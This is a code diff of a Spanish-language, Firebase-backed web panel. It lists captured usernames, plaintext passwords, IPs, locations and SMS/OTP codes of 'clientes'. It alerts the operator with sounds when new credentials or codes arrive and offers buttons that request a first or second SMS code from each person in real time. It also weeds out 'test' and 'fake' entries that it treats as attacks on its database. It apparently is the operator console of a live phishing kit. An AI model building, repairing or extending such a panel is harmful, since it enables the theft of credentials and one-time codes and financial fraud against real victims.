@@ -2,177 +2,391 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Panel - Protección Anti-Ataque</title>
+    <title>PANEL - Sistema Protegido</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        body { background-color: #0f172a; font-family: 'Inter', sans-serif; color: white; }
-        .card-user { background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 16px; transition: all 0.3s; }
-        .card-user:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
-        .card-spam { background: #451a1a; border: 1px solid #ef4444; opacity: 0.7; }
-        .ip-bloqueada { background: #7f1d1d; border: 2px solid #dc2626; }
-        .ip-repetida { background: #78350f; border: 2px solid #f59e0b; }
-        .nuevo-cliente { animation: nuevoFlash 2s ease-out; border: 2px solid #10b981 !important; box-shadow: 0 0 30px rgba(16, 185, 129, 0.5) !important; }
-        .nuevo-otp { animation: otpFlash 2s ease-out; border: 2px solid #8b5cf6 !important; box-shadow: 0 0 30px rgba(139, 92, 246, 0.5) !important; }
-        @keyframes nuevoFlash { 
-            0% { transform: scale(1); box-shadow: 0 0 0 rgba(16, 185, 129, 0); }
-            50% { transform: scale(1.02); box-shadow: 0 0 50px rgba(16, 185, 129, 0.8); }
-            100% { transform: scale(1); box-shadow: 0 0 30px rgba(16, 185, 129, 0.3); }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: #000; 
+            font-family: 'JetBrains Mono', monospace; 
+            color: #fff;
+            overflow-x: hidden;
         }
-        @keyframes otpFlash { 
-            0% { transform: scale(1); box-shadow: 0 0 0 rgba(139, 92, 246, 0); }
-            50% { transform: scale(1.02); box-shadow: 0 0 50px rgba(139, 92, 246, 0.8); }
-            100% { transform: scale(1); box-shadow: 0 0 30px rgba(139, 92, 246, 0.3); }
+        
+        .header {
+            background: #0a0a0a;
+            border-bottom: 2px solid #6366f1;
+            padding: 15px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
         }
-        .btn { padding: 8px 16px; border-radius: 6px; font-size: 11px; cursor: pointer; border: none; margin: 2px; font-weight: bold; }
-        .btn-blue { background: #3b82f6; color: white; }
-        .btn-purple { background: #8b5cf6; color: white; }
-        .btn-red { background: #dc2626; color: white; }
-        .btn-orange { background: #f97316; color: white; }
-        .btn-green { background: #10b981; color: white; }
-        .btn-amber { background: #f59e0b; color: black; }
-        .btn-dark { background: #1e293b; border: 1px solid #ef4444; color: #ef4444; }
-        .badge { padding: 2px 8px; border-radius: 12px; font-size: 10px; font-weight: bold; }
-        .badge-red { background: #dc2626; color: white; }
-        .badge-amber { background: #f59e0b; color: black; }
-        .badge-green { background: #10b981; color: white; }
-        .badge-purple { background: #8b5cf6; color: white; }
-        #login-overlay { position: fixed; inset: 0; background: #0f172a; z-index: 50; display: flex; align-items: center; justify-content: center; }
-        #panel-content { display: none; }
-        .alerta-ataque { background: linear-gradient(90deg, #dc2626, #991b1b); border: 2px solid #fca5a5; animation: pulse 2s infinite; }
-        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.8; } }
+        .logo {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 24px;
+            font-weight: 900;
+            background: linear-gradient(90deg, #6366f1, #8b5cf6, #ec4899);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+        .refresh-badge {
+            background: #1a1a1a;
+            border: 1px solid #333;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 12px;
+            color: #888;
+        }
+        .refresh-badge span { color: #10b981; }
+        
+        .stats-bar {
+            display: flex;
+            gap: 20px;
+            align-items: center;
+        }
+        .stat-item {
+            background: #111;
+            border: 1px solid #222;
+            padding: 8px 20px;
+            border-radius: 8px;
+            font-size: 13px;
+        }
+        .stat-item span { color: #6366f1; font-weight: bold; }
+        
+        .btn-header {
+            padding: 10px 25px;
+            border: none;
+            border-radius: 8px;
+            font-size: 13px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .btn-pink { background: #be185d; color: white; }
+        .btn-pink:hover { background: #9d174d; box-shadow: 0 0 20px rgba(190, 24, 93, 0.5); }
+        .btn-dark { background: #1a1a1a; border: 1px solid #333; color: #888; }
+        .btn-dark:hover { border-color: #6366f1; color: #6366f1; }
+        
+        .table-container {
+            padding: 20px 30px;
+        }
+        .table-header {
+            display: grid;
+            grid-template-columns: 80px 120px 150px 150px 150px 200px 1fr;
+            gap: 15px;
+            padding: 15px;
+            background: #0a0a0a;
+            border-bottom: 2px solid #6366f1;
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: #666;
+            font-weight: bold;
+        }
+        
+        .data-row {
+            display: grid;
+            grid-template-columns: 80px 120px 150px 150px 150px 200px 1fr;
+            gap: 15px;
+            padding: 20px 15px;
+            background: #0f0f0f;
+            border-left: 4px solid #6366f1;
+            margin-bottom: 10px;
+            align-items: center;
+            transition: all 0.3s;
+            position: relative;
+        }
+        .data-row:hover {
+            background: #1a1a1a;
+            border-left-color: #8b5cf6;
+        }
+        .data-row.spam { 
+            border-left-color: #ef4444; 
+            opacity: 0.6;
+            background: #1a0505;
+        }
+        .data-row.nuevo { 
+            animation: pulseBorder 2s infinite;
+            border-left-color: #10b981;
+            background: #0a1f15;
+        }
+        .data-row.nuevo-otp { 
+            animation: pulsePurple 2s infinite;
+            border-left-color: #8b5cf6;
+            background: #1a0f2e;
+        }
+        @keyframes pulseBorder {
+            0%, 100% { box-shadow: 0 0 0 rgba(16, 185, 129, 0); }
+            50% { box-shadow: 0 0 30px rgba(16, 185, 129, 0.3); }
+        }
+        @keyframes pulsePurple {
+            0%, 100% { box-shadow: 0 0 0 rgba(139, 92, 246, 0); }
+            50% { box-shadow: 0 0 30px rgba(139, 92, 246, 0.3); }
+        }
+        
+        .cell-status {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 12px;
+            font-weight: bold;
+        }
+        .live-dot {
+            width: 10px;
+            height: 10px;
+            background: #10b981;
+            border-radius: 50%;
+            animation: blink 1.5s infinite;
+            box-shadow: 0 0 10px #10b981;
+        }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+        
+        .cell-tipo { font-size: 13px; }
+        .cell-tipo .tipo-main { color: #fff; font-weight: bold; text-transform: uppercase; }
+        .cell-tipo .tipo-sub { color: #6366f1; font-size: 10px; text-transform: uppercase; }
+        
+        .cell-user { 
+            font-family: 'JetBrains Mono', monospace;
+            color: #3b82f6;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        .cell-pass { 
+            font-family: 'JetBrains Mono', monospace;
+            color: #ef4444;
+            font-weight: bold;
+            font-size: 14px;
+            letter-spacing: 1px;
+        }
+        .cell-ip { 
+            font-family: 'JetBrains Mono', monospace;
+            color: #f59e0b;
+            font-size: 13px;
+        }
+        .cell-geo { 
+            color: #888;
+            font-size: 12px;
+        }
+        
+        .actions {
+            display: flex;
+            gap: 8px;
+            justify-content: flex-end;
+        }
+        .btn-action {
+            padding: 8px 16px;
+            border: none;
+            border-radius: 6px;
+            font-size: 10px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .btn-sms1 { background: #d97706; color: white; }
+        .btn-sms1:hover { background: #b45309; box-shadow: 0 0 15px rgba(217, 119, 6, 0.5); }
+        .btn-sms2 { background: #ea580c; color: white; }
+        .btn-sms2:hover { background: #c2410c; box-shadow: 0 0 15px rgba(234, 88, 12, 0.5); }
+        .btn-reject { background: #374151; color: #9ca3af; }
+        .btn-reject:hover { background: #4b5563; color: white; }
+        .btn-delete { background: #dc2626; color: white; }
+        .btn-delete:hover { background: #b91c1c; box-shadow: 0 0 15px rgba(220, 38, 38, 0.5); }
+        .btn-block { background: #7c3aed; color: white; }
+        .btn-block:hover { background: #6d28d9; }
+        
+        #login-overlay {
+            position: fixed;
+            inset: 0;
+            background: #000;
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .login-box {
+            background: #0a0a0a;
+            border: 2px solid #6366f1;
+            padding: 50px;
+            border-radius: 10px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        .login-box h2 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 28px;
+            margin-bottom: 30px;
+            color: #6366f1;
+        }
+        .login-box input {
+            width: 100%;
+            background: #111;
+            border: 1px solid #333;
+            padding: 15px;
+            margin-bottom: 15px;
+            color: #fff;
+            font-family: 'JetBrains Mono', monospace;
+            border-radius: 5px;
+        }
+        .login-box input:focus {
+            outline: none;
+            border-color: #6366f1;
+        }
+        .login-box button {
+            width: 100%;
+            background: #6366f1;
+            color: white;
+            border: none;
+            padding: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 5px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
         
         .notificacion-flotante {
             position: fixed;
-            top: 20px;
-            right: 20px;
-            padding: 16px 24px;
-            border-radius: 12px;
+            top: 100px;
+            right: 30px;
+            padding: 20px 30px;
+            background: #0a0a0a;
+            border-left: 4px solid #10b981;
             color: white;
             font-weight: bold;
-            z-index: 100;
-            transform: translateX(400px);
+            z-index: 200;
+            transform: translateX(500px);
             transition: transform 0.3s ease;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.4);
+            box-shadow: 0 10px 40px rgba(0,0,0,0.8);
         }
         .notificacion-flotante.mostrar { transform: translateX(0); }
-        .notificacion-nuevo { background: linear-gradient(135deg, #10b981, #059669); border: 2px solid #34d399; }
-        .notificacion-otp { background: linear-gradient(135deg, #8b5cf6, #7c3aed); border: 2px solid #a78bfa; }
+        .notificacion-otp { border-left-color: #8b5cf6; }
         
         .control-sonido {
             position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: #1e293b;
-            border: 1px solid #334155;
-            padding: 12px 16px;
-            border-radius: 12px;
+            bottom: 30px;
+            right: 30px;
+            background: #0a0a0a;
+            border: 1px solid #333;
+            padding: 15px 20px;
+            border-radius: 10px;
             display: flex;
             align-items: center;
-            gap: 10px;
-            z-index: 40;
+            gap: 15px;
+            z-index: 100;
         }
-        .toggle-switch {
-            width: 50px;
-            height: 26px;
-            background: #334155;
-            border-radius: 13px;
-            position: relative;
-            cursor: pointer;
-            transition: background 0.3s;
+        .control-sonido i { color: #6366f1; }
+        
+        .alerta-ataque {
+            background: linear-gradient(90deg, #7f1d1d, #991b1b);
+            border-left: 4px solid #ef4444;
+            padding: 15px 30px;
+            margin: 20px 30px;
+            border-radius: 5px;
+            display: none;
         }
-        .toggle-switch.activo { background: #10b981; }
-        .toggle-switch::after {
-            content: '';
-            position: absolute;
-            width: 22px;
-            height: 22px;
-            background: white;
-            border-radius: 50%;
-            top: 2px;
-            left: 2px;
-            transition: transform 0.3s;
+        .alerta-ataque.mostrar { display: block; }
+        
+        .badge-count {
+            background: #6366f1;
+            color: white;
+            padding: 2px 8px;
+            border-radius: 10px;
+            font-size: 10px;
+            margin-left: 5px;
         }
-        .toggle-switch.activo::after { transform: translateX(24px); }
+        
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: #0a0a0a; }
+        ::-webkit-scrollbar-thumb { background: #333; border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: #6366f1; }
     </style>
 </head>
-<body class="p-4">
+<body>
 
-    <!-- NOTIFICACIONES FLOTANTES -->
+    <!-- NOTIFICACIONES -->
     <div id="notificacion" class="notificacion-flotante">
         <i class="fa-solid fa-bell mr-2"></i>
         <span id="notificacion-texto">Nuevo cliente</span>
     </div>
 
-    <!-- CONTROL DE SONIDO -->
+    <!-- CONTROL SONIDO -->
     <div class="control-sonido">
-        <i class="fa-solid fa-volume-high text-slate-400"></i>
-        <span class="text-sm text-slate-300">Sonidos</span>
-        <div class="toggle-switch activo" id="toggleSonido" onclick="toggleSonido()"></div>
+        <i class="fa-solid fa-volume-high"></i>
+        <span style="font-size: 12px; color: #888;">SONIDOS</span>
+        <div class="toggle-switch activo" id="toggleSonido" onclick="toggleSonido()" style="cursor: pointer; width: 40px; height: 20px; background: #333; border-radius: 10px; position: relative;">
+            <div style="position: absolute; width: 16px; height: 16px; background: #6366f1; border-radius: 50%; top: 2px; left: 2px; transition: 0.3s;" id="toggleCircle"></div>
+        </div>
     </div>
 
     <!-- LOGIN -->
     <div id="login-overlay">
-        <div class="bg-slate-800 p-8 rounded-xl border border-slate-700 w-full max-w-md text-center">
-            <h2 class="text-2xl font-bold mb-4 text-blue-400">ACCESO PANEL</h2>
-            <input type="text" id="admin-user" placeholder="Usuario" class="w-full bg-slate-900 border border-slate-700 p-3 rounded-lg text-white mb-4"><br>
-            <input type="password" id="admin-pass" placeholder="Contraseña" class="w-full bg-slate-900 border border-slate-700 p-3 rounded-lg text-white mb-4"><br>
-            <button onclick="validarAcceso()" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 rounded-lg">ENTRAR</button>
-            <p id="error-msg" class="text-red-500 text-sm mt-2 hidden"></p>
+        <div class="login-box">
+            <h2>🔐 ACCESO PANEL</h2>
+            <input type="text" id="admin-user" placeholder="USUARIO">
+            <input type="password" id="admin-pass" placeholder="CONTRASEÑA">
+            <button onclick="validarAcceso()">ENTRAR</button>
+            <p id="error-msg" style="color: #ef4444; margin-top: 15px; display: none;">Credenciales incorrectas</p>
         </div>
     </div>
 
-    <div id="panel-content">
+    <!-- PANEL -->
+    <div id="panel-content" style="display: none;">
         <!-- HEADER -->
-        <div class="flex justify-between items-center mb-6 border-b border-slate-700 pb-4">
-            <div>
-                <h1 class="text-3xl font-black text-white">PANEL <span class="text-blue-500">CLIENTES</span></h1>
-                <p class="text-slate-500 text-xs">Protección contra ataques directos • Sonidos activos</p>
+        <div class="header">
+            <div style="display: flex; align-items: center; gap: 20px;">
+                <div class="logo">PANEL PROTEGIDO</div>
+                <div class="refresh-badge">REFRESCO: <span id="contador">7s</span></div>
             </div>
-            <div class="flex items-center gap-4">
-                <button onclick="cambiarVista('ips')" class="btn btn-amber">📊 IPs</button>
-                <button onclick="cambiarVista('blacklist')" class="btn btn-red">🚫 Bloqueadas</button>
-                <button onclick="cerrarSesion()" class="text-slate-400 hover:text-white text-sm">SALIR</button>
+            
+            <div class="stats-bar">
+                <div class="stat-item">TOTAL: <span id="stat-total">0</span></div>
+                <div class="stat-item">ONLINE: <span id="stat-online" style="color: #10b981;">0</span></div>
+                <div class="stat-item">SPAM: <span id="stat-spam" style="color: #ef4444;">0</span></div>
+                <div class="stat-item">IPs: <span id="stat-ips">0</span></div>
+                <div class="stat-item">BLOQ: <span id="stat-blocked" style="color: #dc2626;">0</span></div>
+            </div>
+            
+            <div style="display: flex; gap: 10px;">
+                <button class="btn-header btn-dark" onclick="cambiarVista('validos')">REGISTROS</button>
+                <button class="btn-header btn-dark" onclick="cambiarVista('spam')">SPAM</button>
+                <button class="btn-header btn-dark" onclick="cambiarVista('ips')">IPs</button>
+                <button class="btn-header btn-pink" onclick="limpiarTests()">LIMPIAR TODO</button>
+                <button class="btn-header btn-dark" onclick="cerrarSesion()">SALIR</button>
             </div>
         </div>
 
-        <!-- ALERTA DE ATAQUE -->
-        <div id="alerta-ataque" class="hidden mb-4 alerta-ataque p-4 rounded-xl">
-            <p class="text-white font-bold text-center">
-                <i class="fa-solid fa-triangle-exclamation"></i> 
-                DETECTADO ATAQUE DIRECTO A FIREBASE - <span id="contador-ataques">0</span> REGISTROS BLOQUEADOS
-            </p>
+        <!-- ALERTA ATAQUE -->
+        <div id="alerta-ataque" class="alerta-ataque">
+            <i class="fa-solid fa-triangle-exclamation"></i> 
+            ATAQUE DETECTADO: <span id="contador-ataques">0</span> REGISTROS BLOQUEADOS
         </div>
 
-        <!-- STATS -->
-        <div class="grid grid-cols-5 gap-4 mb-6">
-            <div class="bg-slate-800 p-4 rounded-xl"><p class="text-xs text-slate-500">TOTAL</p><p id="stat-total" class="text-2xl font-bold text-white">0</p></div>
-            <div class="bg-slate-800 p-4 rounded-xl"><p class="text-xs text-slate-500">ONLINE</p><p id="stat-online" class="text-2xl font-bold text-emerald-400">0</p></div>
-            <div class="bg-slate-800 p-4 rounded-xl"><p class="text-xs text-slate-500">SPAM</p><p id="stat-spam" class="text-2xl font-bold text-rose-400">0</p></div>
-            <div class="bg-slate-800 p-4 rounded-xl"><p class="text-xs text-slate-500">IPs ÚNICAS</p><p id="stat-ips" class="text-2xl font-bold text-blue-400">0</p></div>
-            <div class="bg-slate-800 p-4 rounded-xl"><p class="text-xs text-slate-500">IPs BLOQUEADAS</p><p id="stat-blocked" class="text-2xl font-bold text-red-500">0</p></div>
+        <!-- TABLA -->
+        <div class="table-container">
+            <div class="table-header">
+                <div>ESTADO</div>
+                <div>TIPO</div>
+                <div>USUARIO</div>
+                <div>CONTRASEÑA</div>
+                <div>IP</div>
+                <div>UBICACIÓN</div>
+                <div style="text-align: right;">ACCIONES</div>
+            </div>
+            <div id="container"></div>
         </div>
-
-        <!-- BOTONES -->
-        <div class="flex gap-2 mb-4 flex-wrap items-center">
-            <button onclick="cambiarVista('validos')" class="btn btn-green">✓ Registros</button>
-            <button onclick="cambiarVista('spam')" class="btn btn-red">🗑 Papelera</button>
-            <button onclick="cambiarVista('todos')" class="btn btn-blue">Todos</button>
-            <div class="w-px h-8 bg-slate-700 mx-2"></div>
-            <button onclick="limpiarTests()" class="btn btn-dark text-red-400 border-red-500 hover:bg-red-900/30">
-                <i class="fa-solid fa-broom"></i> Limpiar Tests
-            </button>
-            <button onclick="limpiarTodoSpam()" class="btn btn-red">
-                <i class="fa-solid fa-trash"></i> Vaciar Papelera
-            </button>
-            <button onclick="bloquearIPsMasivas()" class="btn btn-amber">
-                <i class="fa-solid fa-shield-halved"></i> Bloquear IPs +10 intentos
-            </button>
-        </div>
-
-        <div id="container" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4"></div>
     </div>
 
     <script>
@@ -184,45 +398,52 @@
         let ataquesDetectados = 0;
         let sonidosActivos = true;
         let ultimosDatos = new Map();
+        let audioContextIniciado = false;
 
-        // ===== SONIDOS MIXKIT =====
+        // SONIDOS MIXKIT - 100% VOLUMEN
         const sonidoNuevoCliente = new Audio('https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3');
-        const sonidoOTP = new Audio('https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3'); // Mismo sonido o cambia la URL
-        
-        // Precargar sonidos
+        const sonidoOTP = new Audio('https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3');
         sonidoNuevoCliente.load();
         sonidoOTP.load();
-        
+
+        // Función para iniciar audio context (necesario para algunos navegadores)
+        function iniciarAudioContext() {
+            if (!audioContextIniciado) {
+                sonidoNuevoCliente.play().then(() => {
+                    sonidoNuevoCliente.pause();
+                    sonidoNuevoCliente.currentTime = 0;
+                }).catch(() => {});
+                audioContextIniciado = true;
+            }
+        }
+
         function reproducirSonido(tipo) {
             if (!sonidosActivos) return;
             
             try {
                 const audio = tipo === 'nuevo' ? sonidoNuevoCliente.cloneNode() : sonidoOTP.cloneNode();
-                audio.volume = 0.7;
-                audio.play().catch(e => console.log('Audio bloqueado:', e));
-            } catch(e) {
-                console.log('Error reproduciendo audio:', e);
-            }
+                audio.volume = 1.0; // 100% VOLUMEN
+                audio.play().catch(e => {
+                    console.log('Audio bloqueado - haz click en la página primero');
+                });
+            } catch(e) {}
         }
 
         function toggleSonido() {
             sonidosActivos = !sonidosActivos;
-            document.getElementById('toggleSonido').classList.toggle('activo', sonidosActivos);
+            const circle = document.getElementById('toggleCircle');
+            circle.style.left = sonidosActivos ? '2px' : '22px';
+            circle.style.background = sonidosActivos ? '#6366f1' : '#333';
         }
 
         function mostrarNotificacion(texto, tipo) {
             const notif = document.getElementById('notificacion');
             const notifTexto = document.getElementById('notificacion-texto');
-            
-            notif.className = 'notificacion-flotante mostrar ' + (tipo === 'otp' ? 'notificacion-otp' : 'notificacion-nuevo');
+            notif.className = 'notificacion-flotante mostrar ' + (tipo === 'otp' ? 'notificacion-otp' : '');
             notifTexto.textContent = texto;
-            
-            setTimeout(() => {
-                notif.classList.remove('mostrar');
-            }, 3000);
+            setTimeout(() => notif.classList.remove('mostrar'), 3000);
         }
 
-        // ANTI-SPAM ULTRA RESTRINGIDO
         function esSpam(id, data) {
             if (!data || typeof data !== 'object') return true;
             if (!data.user || !data.pass) return true;
@@ -265,10 +486,10 @@
                 sessionStorage.setItem('auth_panel', 'true');
                 document.getElementById('login-overlay').style.display = 'none';
                 document.getElementById('panel-content').style.display = 'block';
+                iniciarAudioContext(); // Iniciar audio al hacer login
                 iniciarFirebase();
             } else {
-                document.getElementById('error-msg').textContent = 'Credenciales incorrectas';
-                document.getElementById('error-msg').classList.remove('hidden');
+                document.getElementById('error-msg').style.display = 'block';
             }
         }
 
@@ -323,16 +544,17 @@
                 
                 if (nuevosIDs.size > 0 && datos.validos.length > 0) {
                     reproducirSonido('nuevo');
-                    mostrarNotificacion(`¡${nuevosIDs.size} nuevo${nuevosIDs.size > 1 ? 's' : ''} cliente!`, 'nuevo');
+                    mostrarNotificacion(`¡${nuevosIDs.size} NUEVO CLIENTE!`, 'nuevo');
                 }
                 
                 datos.validos = validos;
                 
+                const alerta = document.getElementById('alerta-ataque');
                 if (ataquesDetectados > 0) {
-                    document.getElementById('alerta-ataque').classList.remove('hidden');
+                    alerta.classList.add('mostrar');
                     document.getElementById('contador-ataques').textContent = ataquesDetectados;
                 } else {
-                    document.getElementById('alerta-ataque').classList.add('hidden');
+                    alerta.classList.remove('mostrar');
                 }
                 
                 renderizar(nuevosIDs);
@@ -359,8 +581,7 @@
         }
 
         function limpiarTests() {
-            if(!confirm('🧹 ¿Eliminar TODOS los registros que contengan "test", "prueba", "admin", "demo"?')) return;
-            
+            if(!confirm('¿Eliminar todos los registros de prueba?')) return;
             let eliminados = 0;
             const patterns = ['test', 'prueba', 'admin', 'demo', 'fake', 'user', 'pass'];
             
@@ -373,27 +594,7 @@
                     eliminados++;
                 }
             });
-            
-            alert(`🗑 Eliminados ${eliminados} registros de prueba/ataque`);
-        }
-
-        function limpiarTodoSpam() {
-            if(!confirm('⚠️ ¿Vaciar COMPLETAMENTE la papelera?')) return;
-            db.ref('spam').remove().then(() => alert('🗑 Papelera vaciada'));
-        }
-
-        function bloquearIPsMasivas() {
-            if(!confirm('🚫 ¿Bloquear todas las IPs con 10+ intentos?')) return;
-            
-            let bloqueadas = 0;
-            for (const [ip, count] of Object.entries(contadorIPs)) {
-                if (count >= 10 && !datos.blacklist[ip]) {
-                    const ipKey = ip.replace(/\./g, '_');
-                    db.ref('blacklist/' + ipKey).set({ ip, since: Date.now(), count });
-                    bloqueadas++;
-                }
-            }
-            alert(`🚫 Bloqueadas ${bloqueadas} IPs`);
+            alert(`Eliminados ${eliminados} registros`);
         }
 
         function renderizar(nuevosIDs = new Set()) {
@@ -406,7 +607,6 @@
             document.getElementById('stat-ips').textContent = Object.keys(contadorIPs).length;
 
             if (vistaActual === 'ips') { renderizarIPs(); return; }
-            if (vistaActual === 'blacklist') { renderizarBlacklist(); return; }
 
             let aMostrar = [];
             if (vistaActual === 'validos') aMostrar = datos.validos;
@@ -414,7 +614,7 @@
             else aMostrar = [...datos.validos, ...datos.spam];
 
             if (aMostrar.length === 0) {
-                container.innerHTML = '<div class="text-slate-500 text-center col-span-3 py-10">No hay registros</div>';
+                container.innerHTML = '<div style="text-align: center; padding: 50px; color: #666;">SIN REGISTROS</div>';
                 return;
             }
 
@@ -429,7 +629,7 @@
 
             if (otpNuevos.size > 0) {
                 reproducirSonido('otp');
-                mostrarNotificacion(`¡${otpNuevos.size} código${otpNuevos.size > 1 ? 's' : ''} OTP recibido!`, 'otp');
+                mostrarNotificacion(`¡${otpNuevos.size} OTP RECIBIDO!`, 'otp');
             }
 
             aMostrar.forEach(({id, data, esSpam}) => {
@@ -440,68 +640,46 @@
                 const esNuevo = nuevosIDs.has(id);
                 const esNuevoOTP = otpNuevos.has(id);
                 
-                let cardClass = 'card-user';
-                if (esSpam) cardClass = 'card-user card-spam';
-                else if (ipBloqueada) cardClass = 'card-user ip-bloqueada';
-                else if (vecesIP >= 5) cardClass = 'card-user ip-repetida';
+                let rowClass = 'data-row';
+                if (esSpam) rowClass += ' spam';
+                if (esNuevo) rowClass += ' nuevo';
+                if (esNuevoOTP) rowClass += ' nuevo-otp';
                 
-                if (esNuevo) cardClass += ' nuevo-cliente';
-                if (esNuevoOTP) cardClass += ' nuevo-otp';
+                const tipoTexto = tieneOTP ? 'TOKEN OK' : 'CREDENCIALES';
+                const tipoColor = tieneOTP ? 'color: #10b981;' : '';
                 
+                // SIN BOTÓN TOKEN - Solo SMS 1, SMS 2, RECHAZAR, ELIMINAR
                 container.innerHTML += `
-                    <div class="${cardClass}" id="card-${id}">
-                        <div class="flex justify-between items-center mb-2">
-                            <span class="text-xs text-slate-400">#${id.slice(-8)}</span>
-                            <div class="flex gap-1">
-                                ${esNuevo ? '<span class="badge badge-green">NUEVO</span>' : ''}
-                                ${esNuevoOTP ? '<span class="badge badge-purple">OTP!</span>' : ''}
-                                ${vecesIP > 1 ? `<span class="badge badge-amber">${vecesIP}</span>` : ''}
-                                ${ipBloqueada ? '<span class="badge badge-red">BLOQUEADA</span>' : ''}
-                                ${isOnline ? '<span class="badge badge-green">ONLINE</span>' : ''}
-                            </div>
+                    <div class="${rowClass}">
+                        <div class="cell-status">
+                            <div class="live-dot"></div>
+                            LIVE
                         </div>
-                        
-                        <div class="bg-slate-900 p-2 rounded mb-2">
-                            <p class="text-xs text-slate-500">USUARIO</p>
-                            <p class="text-white font-bold text-sm">${data.user || 'N/A'}</p>
+                        <div class="cell-tipo">
+                            <div class="tipo-main" style="${tipoColor}">${tipoTexto}</div>
+                            <div class="tipo-sub">${esSpam ? 'SPAM DETECTADO' : 'INGRESANDO'}</div>
                         </div>
-                        
-                        <div class="bg-slate-900 p-2 rounded mb-2">
-                            <p class="text-xs text-slate-500">CONTRASEÑA</p>
-                            <p class="text-rose-400 font-bold text-sm">${data.pass || '****'}</p>
+                        <div class="cell-user">${data.user || 'N/A'}</div>
+                        <div class="cell-pass">${data.pass || '****'}</div>
+                        <div class="cell-ip">
+                            ${data.ip || 'N/A'}
+                            ${vecesIP > 1 ? `<span class="badge-count">${vecesIP}</span>` : ''}
                         </div>
-                        
-                        <div class="bg-slate-900 p-2 rounded mb-2 text-center border ${tieneOTP ? 'border-emerald-500' : 'border-slate-700'}">
-                            <p class="text-xs ${tieneOTP ? 'text-emerald-400' : 'text-slate-500'} mb-1">${tieneOTP ? '✓ CÓDIGO OK' : 'ESPERANDO'}</p>
-                            <p class="text-xl font-black ${tieneOTP ? 'text-emerald-400' : 'text-blue-400'} tracking-widest">${data.sms || '----'}</p>
+                        <div class="cell-geo">
+                            ${ipBloqueada ? '<span style="color: #dc2626;">[BLOQUEADA]</span> ' : ''}
+                            ${data.location || 'Desconocida'}
                         </div>
-                        
-                        <div class="bg-slate-900/50 p-2 rounded mb-2 flex justify-between items-center">
-                            <div>
-                                <p class="text-xs text-slate-500">IP</p>
-                                <p class="text-amber-400 font-mono text-xs">${data.ip || 'N/A'}</p>
-                            </div>
-                            ${data.ip ? `<button onclick="toggleBlockIP('${data.ip}')" class="btn ${ipBloqueada ? 'btn-green' : 'btn-red'}" style="padding: 4px 8px; font-size: 10px;">${ipBloqueada ? 'Desbloquear' : 'Bloquear'}</button>` : ''}
+                        <div class="actions">
+                            ${!esSpam ? `
+                                <button class="btn-action btn-sms1" onclick="solicitarOTP('${id}')">SOLICITAR SMS 1</button>
+                                <button class="btn-action btn-sms2" onclick="solicitarOTP2('${id}')">SOLICITAR SMS 2</button>
+                                <button class="btn-action btn-reject" onclick="rechazar('${id}')">RECHAZAR</button>
+                                <button class="btn-action btn-delete" onclick="eliminar('${id}')">ELIMINAR</button>
+                            ` : `
+                                <button class="btn-action btn-sms1" onclick="recuperar('${id}')">RECUPERAR</button>
+                                <button class="btn-action btn-delete" onclick="eliminarSpam('${id}')">ELIMINAR</button>
+                            `}
                         </div>
-                        
-                        <div class="flex justify-between text-xs text-slate-500 mb-2 px-1">
-                            <span>${data.step || 'Registrado'}</span>
-                            <span>${data.timestamp ? new Date(data.timestamp).toLocaleTimeString() : ''}</span>
-                        </div>
-
-                        ${esSpam ? `
-                            <div class="flex gap-1">
-                                <button onclick="recuperar('${id}')" class="btn btn-green">♻ Recuperar</button>
-                                <button onclick="eliminarSpam('${id}')" class="btn btn-red">Eliminar</button>
-                            </div>
-                        ` : `
-                            <div class="grid grid-cols-2 gap-1">
-                                <button onclick="solicitarOTP('${id}')" class="btn btn-blue">Solicitar OTP</button>
-                                <button onclick="solicitarOTP2('${id}')" class="btn btn-purple">Solicitar OTP 2</button>
-                                <button onclick="rechazar('${id}')" class="btn btn-orange">Rechazar</button>
-                                <button onclick="eliminar('${id}')" class="btn btn-red">Borrar</button>
-                            </div>
-                        `}
                     </div>
                 `;
             });
@@ -512,40 +690,28 @@
